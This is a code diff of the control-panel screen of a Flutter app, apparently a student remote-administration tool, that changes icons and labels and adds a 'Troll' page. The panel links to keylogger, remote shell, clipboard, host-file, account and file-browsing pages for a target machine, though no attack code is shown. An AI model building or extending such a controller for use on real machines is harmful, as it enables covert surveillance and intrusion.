@@ -7,7 +7,7 @@ import 'package:inferno_core_fyp/res/constants.dart';
 import 'package:inferno_core_fyp/res/helper_extensions.dart';
 import 'package:inferno_core_fyp/view/controls/accounts.dart';
 import 'package:inferno_core_fyp/view/controls/clipboard.dart';
-import 'package:inferno_core_fyp/view/controls/harware_info.dart';
+import 'package:inferno_core_fyp/view/controls/hardware_info.dart';
 import 'package:inferno_core_fyp/view/controls/host_file.dart';
 import 'package:inferno_core_fyp/view/controls/keylogger.dart';
 import 'package:inferno_core_fyp/view/controls/network.dart';
@@ -15,6 +15,7 @@ import 'package:inferno_core_fyp/view/controls/pc_commands.dart';
 import 'package:inferno_core_fyp/view/controls/shell.dart';
 import 'package:inferno_core_fyp/view/controls/system_files.dart';
 import 'package:inferno_core_fyp/view/controls/task_manager.dart';
+import 'package:inferno_core_fyp/view/controls/troll_page.dart';
 
 import '../res/widgets/general widgets/dotted_strings.dart';
 import '../res/widgets/general widgets/my_text.dart';
@@ -91,17 +92,17 @@ class _ControlPanelState extends State<ControlPanel> {
                 items: [
                   CommandItem(
                     text: "PC",
-                    icon: Icons.desktop_windows_outlined,
-                    iconSize: 27,
+                    icon: Icons.tv,
+                    iconSize: 29,
                     onTap: () {
                       Get.to(() => PcCommandsPage(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
-                    text: "Account",
+                    text: "Accounts",
                     icon: FontAwesomeIcons.circleUser,
                     onTap: () {
-                      Get.to(() => const Accounts());
+                      Get.to(() => Accounts(targetId: widget.targetId));
                     },
                   ),
                   // CommandItem(
@@ -111,29 +112,32 @@ class _ControlPanelState extends State<ControlPanel> {
                   // ),
                   CommandItem(
                     text: "Hardware info",
-                    icon: Icons.hardware,
-                    iconSize: 29,
+                    icon: FontAwesomeIcons.microchip,
+                    iconSize: 28,
                     onTap: () {
                       Get.to(() => HardwareInfoPage(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
                     text: "Programs",
-                    icon: Icons.computer,
+                    icon: Icons.widgets,
+                    iconSize: 30,
                     onTap: () {
                       Get.to(() => Programs(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
                     text: "Task Manager",
-                    icon: Icons.task,
+                    icon: Icons.assignment_turned_in,
+                    iconSize: 30,
                     onTap: () {
                       Get.to(() => TaskManagerPage(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
                     text: "HostFile",
-                    icon: Icons.file_copy,
+                    icon: FontAwesomeIcons.file,
+                    iconSize: 30,
                     onTap: () {
                       Get.to(() => HostFilePage(targetId: widget.targetId));
                     },
@@ -153,13 +157,13 @@ class _ControlPanelState extends State<ControlPanel> {
                   ),
                   CommandItem(
                     text: "Screen",
-                    icon: Icons.screenshot_monitor_outlined,
+                    icon: Icons.desktop_windows_outlined,
                     iconSize: 30,
                     onTap: () {},
                   ),
                   CommandItem(
                     text: "Network",
-                    icon: Icons.network_wifi,
+                    icon: Icons.wifi,
                     iconSize: 30,
                     onTap: () {
                       Get.to(() => Network(targetId: widget.targetId));
@@ -171,31 +175,41 @@ class _ControlPanelState extends State<ControlPanel> {
                 sectionName: "Other commands",
                 items: [
                   CommandItem(
-                    text: "Shell",
-                    icon: FontAwesomeIcons.solidFileCode,
-                    onTap: () {
-                      Get.to(() => Shell(targetId: widget.targetId));
-                    },
-                  ),
-                  CommandItem(
-                    text: "Files",
+                    text: "System Files",
                     icon: CupertinoIcons.folder_fill,
                     onTap: () {
                       Get.to(() => SystemFiles(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
+                    text: "Shell",
+                    icon: FontAwesomeIcons.terminal,
+                    onTap: () {
+                      Get.to(() => Shell(targetId: widget.targetId));
+                    },
+                  ),
+                  CommandItem(
                     text: "Clipboard",
                     icon: FontAwesomeIcons.clipboard,
+                    iconSize: 30,
                     onTap: () {
                       Get.to(() => ClipboardPage(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
                     text: "Miscellaneous",
-                    icon: Icons.miscellaneous_services,
+                    icon: FontAwesomeIcons.cubes,
+                    iconSize: 30,
                     onTap: () {
                       Get.to(() => const Miscellaneous());
+                    },
+                  ),
+                  CommandItem(
+                    text: "Troll",
+                    icon: FontAwesomeIcons.masksTheater,
+                    iconSize: 32,
+                    onTap: () {
+                      Get.to(() => TrollPage(targetId: widget.targetId));
                     },
                   ),
                 ],
